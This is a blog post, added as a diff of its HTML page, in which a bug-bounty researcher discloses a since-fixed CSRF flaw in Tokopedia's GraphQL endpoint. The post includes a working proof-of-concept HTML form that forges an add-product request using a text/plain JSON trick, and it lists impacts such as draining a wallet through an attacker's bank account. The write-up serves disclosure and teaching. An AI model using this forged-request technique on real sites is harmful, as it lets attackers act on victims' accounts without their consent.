@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>[TOKOPEDIA] SITE-WIDE CSRF THROUGH GRAPHQL REQUEST</title>
+	
+	<meta name="description" content="Recently, I have found security vulnerability in Tokopedia Website that allows CSRF in some critical action because of improper validation of content type (JSON) of body request that sent to the server. This action is possible because Tokopedia implementation of GraphQL is using session cookie instead of authentication key in header.">
+	
+	<meta name="author" content="Rafie Muhammad">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/rafiem">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/rafiem777">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:rafiemuhammad07@gmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			z
+			<a class="navbar-brand" href="/">
+				<img src="//www.gravatar.com/avatar/059f50a149f4ac584e791d2963a85274?s=35" class="img-circle" />
+				Yeraisci
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories.html">Categories</a></li>
+				<li><a href="/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs" style="">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="//www.gravatar.com/avatar/059f50a149f4ac584e791d2963a85274?s=150" class="img-circle" />
+	</a>
+	<h3 class="title">
+        <a href="/">Yeraisci</a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Try Hard Learner
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/rafiem">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/rafiem777">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:rafiemuhammad07@gmail.com">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/rafiemuhammad">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+		<li>
+			<a class="btn btn-default btn-sm" href="https://hackerone.com/rafiem">
+				<i class="fa fa-h-square fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1 align="center">[TOKOPEDIA] SITE-WIDE CSRF THROUGH GRAPHQL REQUEST </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   March 
+	   25th,
+	   
+	   2019
+	 </span>
+	  <div class="article_body">
+	  <h2 id="what-is-cross-site-request-forgery-">What is Cross Site Request Forgery ?</h2>
+<hr />
+
+<p>Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request.<br /><br /></p>
+
+<h2 id="what-is-graph-query-language-">What is Graph Query Language ?</h2>
+<hr />
+
+<p>GraphQL is a query language for APIs and a runtime for fulfilling those queries with your existing data. GraphQL provides a complete and understandable description of the data in your API, gives clients the power to ask for exactly what they need and nothing more, makes it easier to evolve APIs over time, and enables powerful developer tools.<br /><br /></p>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<hr />
+
+<p>When visiting <a href="https://m.tokopedia.com/">https://m.tokopedia.com</a>, most of the request is using <code class="highlighter-rouge">GraphQL</code> endpoint in <a href="https://gql.tokopedia.com/">https://gql.tokopedia.com</a>.Here is the example request to add product to wishlist :</p>
+
+<p><img src="/assets/media/example_request_add_wishlist.png" alt="Example Request Add Wishlist" />
+<br /><br />
+When looking at the request in burpsuite, i notice something interesting.The request to <code class="highlighter-rouge">GraphQL</code> endpoint is not using an authentication key or token in the request header.Usually, <code class="highlighter-rouge">GraphQL</code> is more like <code class="highlighter-rouge">API</code> style that use authentication key to get data, but Tokopedia seems to implement the request to <code class="highlighter-rouge">GraphQL</code> endpoint using session and cookie as authentication.<br />
+<br />
+Indeed, before make an actual request to get the data, it will check the authentication to <code class="highlighter-rouge">GraphQL</code> using this request :</p>
+
+<p><img src="/assets/media/request_check_auth_graphql.png" alt="Authentication GraphQL" />
+<br /><br />
+I’m thinking if we can somehow perform a CSRF attack to the <code class="highlighter-rouge">GraphQL</code> endpoint.Then i try to modify request data in burpsuite.Several change that i made to the request :</p>
+<ol>
+  <li>Remove the <code class="highlighter-rouge">Referer</code></li>
+  <li>Set <code class="highlighter-rouge">Origin</code> to <code class="highlighter-rouge">null</code></li>
+  <li>Set <code class="highlighter-rouge">content-type</code> to <code class="highlighter-rouge">text/plain</code></li>
+  <li>Append <code class="highlighter-rouge">"="</code> to the end of body request</li>
+</ol>
+
+<p>Appending <code class="highlighter-rouge">"="</code> to the end of the body request is to test if we can make a request of <code class="highlighter-rouge">JSON</code> data using post form in html and using enctype <code class="highlighter-rouge">text/plain</code>.After modifying the request, test to send the request. (Example image below is request to change profile image)</p>
+
+<p><img src="/assets/media/example_request_change_picture.png" alt="Modified Request" />
+<br /><br /><br />
+<img src="/assets/media/shocked_bounty.gif" class="media_center" style="width: 50%; height: 50%" /></p>
+<h4 align="center"><b>And it works !</b></h4>
+<p><br /><br /></p>
+
+<p>We can then craft a simple html to make a CSRF attack (This POC use sample request of uploading a product to the store) :</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+    <span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;h1&gt;</span>Site Wide CSRF GraphQL : Add Product to Target User<span class="nt">&lt;/h1&gt;</span>
+    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://gql.tokopedia.com/"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">enctype=</span><span class="s">"text/plain"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">'[{"operationName":"AddProductMutation","variables":{"input":{"product_brand":{"brand_id":0,"name":""},"product_catalog":{"catalog_id":0},"product_category":{"category_id":891},"product_condition":1,"product_description":"Attacker","product_etalase":{"etalase_id":17561860},"product_free_return":false,"product_min_order":1,"product_must_insurance":false,"product_name":"Added by Attacker","product_picture":[{"from_ig":0,"description":"","x":1,"y":1,"file_path":"product-1/2019/2/6/44628626","file_name":"44628626_6070a039-2f84-4d8c-99b8-c3d68083ebf7_980_759.png"}],"product_preorder":{"preorder_process_time":0,"preorder_status":0,"preorder_time_unit":1},"product_price":100,"product_price_currency":1,"product_sku":"","product_status":1,"product_stock":0,"product_video":[],"product_weight":100,"product_weight_unit":1,"product_wholesale":[]}},"query":"mutation AddProductMutation($input: AddProductInputType) {\n  addProduct(input: $input) {\n    header {\n      messages\n      reason\n      __typename\n    }\n    data {\n      product_id\n      product_name\n      product_alias\n      product_condition\n      product_description\n      product_last_update_price\n      product_min_order\n      product_max_order\n      product_must_insurance\n      product_price\n      product_price_currency\n      product_status\n      product_stock\n      product_weight\n      product_weight_unit\n      product_url\n      product_category {\n        category_id\n        __typename\n      }\n      product_etalase {\n        etalase_id\n        etalase_name\n        __typename\n      }\n      product_position {\n        position\n        __typename\n      }\n      product_shop {\n        shop_id\n        shop_name\n        shop_domain\n        shop_url\n        __typename\n      }\n      product_free_return\n      product_sku\n      product_gtin\n      product_name_editable\n      __typename\n    }\n    errors\n    __typename\n  }\n}\n"}]'</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Click Me !"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+    <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>In above crafted html, is to make a CSRF request to add product to the store (by just modifying the <code class="highlighter-rouge">etalase_id</code> to id that the targeted store own).When a targeted user or store account visit webpage that hosting this crafted html and click the submit button (or we can make this auto submit using javascript), the CSRF request will be fired and a product is added to the targeted store without user consent.<br /><br /></p>
+
+<h2 id="impact">Impact</h2>
+<hr />
+
+<p>Seeing that request in <a href="https://m.tokopedia.com/">https://m.tokopedia.com</a> mostly using <code class="highlighter-rouge">GraphQL</code>, there is several impact from this security issue :</p>
+<ol>
+  <li>Change user account profile picture</li>
+  <li>Add, edit and delete product from the store</li>
+  <li>Add, edit and delete address from user account</li>
+  <li>Change profile picture, description, status, slogan of the store</li>
+  <li>Add, edit and delete send address of the store</li>
+  <li>Add, edit and delete store note</li>
+  <li>Stealing tokopedia wallet by adding attacker bank account to targeted user account</li>
+  <li>Perform anything about <code class="highlighter-rouge">order</code> action behalf of the user</li>
+  <li>etc</li>
+</ol>
+
+<p>That’s all from my first blog post, see you again in my next blog post (hopefully).<br />
+Happy Bug Hunting !</p>
+
+<h2 id="timeline">Timeline</h2>
+
+<hr />
+
+<table align="center">
+  <thead>
+    <tr>
+      <th>Timestamp</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>February 6th 2019</td>
+      <td>Report Submited</td>
+    </tr>
+    <tr>
+      <td>February 6th 2019</td>
+      <td>Report is valid and marked as high severity</td>
+    </tr>
+    <tr>
+      <td>March 25th 2019</td>
+      <td>Check the vulnerability is fixed and follow up to tokopedia team</td>
+    </tr>
+    <tr>
+      <td>March 25th 2019</td>
+      <td>Tokopedia confirm the bug has been fixed</td>
+    </tr>
+    <tr>
+      <td>May 27th 2019</td>
+      <td>Reward sent</td>
+    </tr>
+    <tr>
+      <td>July 15th 2019</td>
+      <td>Tokopedia Agree to Disclose The Bug</td>
+    </tr>
+  </tbody>
+</table>
+
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories.html#bugbounty-ref">
+					bugbounty <span>(1)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="/tags.html#tokopedia-ref">
+					tokopedia <span>(1)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#bugbounty-ref">
+					bugbounty <span>(1)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=[TOKOPEDIA] SITE-WIDE CSRF THROUGH GRAPHQL REQUEST&via=rafiem777"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="//www.gravatar.com/avatar/059f50a149f4ac584e791d2963a85274" class="img-rounded author-image" />
+        <h4 class="section-title author-name">Rafie Muhammad</h4>
+        <p class="author-bio">Try Hard Learner</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous disabled"><a>&larr; Previous</a></li>
+		  
+		  
+			<li class="next disabled"><a>Next &rarr;</a>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2019 Rafie Muhammad with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
+
